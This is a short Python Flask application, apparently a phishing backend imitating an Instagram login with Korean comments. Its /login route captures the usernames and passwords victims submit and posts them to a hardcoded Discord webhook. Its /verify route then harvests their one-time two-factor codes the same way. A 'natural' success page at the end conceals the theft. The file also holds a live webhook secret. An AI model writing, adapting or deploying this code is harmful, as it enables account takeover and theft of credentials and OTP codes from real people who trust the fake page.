from flask import Flask, render_template, request, session
import requests

app = Flask(__name__)
app.secret_key = "insta_final_key"

# 수신용 디스코드 웹훅
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    session['username'] = username
    requests.post(WEBHOOK_URL, json={"content": f"🚨 **로그인 시도**\nID: `{username}`\nPW: `{password}`"})
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')
    requests.post(WEBHOOK_URL, json={"content": f"🔑 **OTP 전송**\n유저: `{username}`\n코드: **{otp_code}**"})
    return render_template('success.html') # 자연스러운 마무리 페이지

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
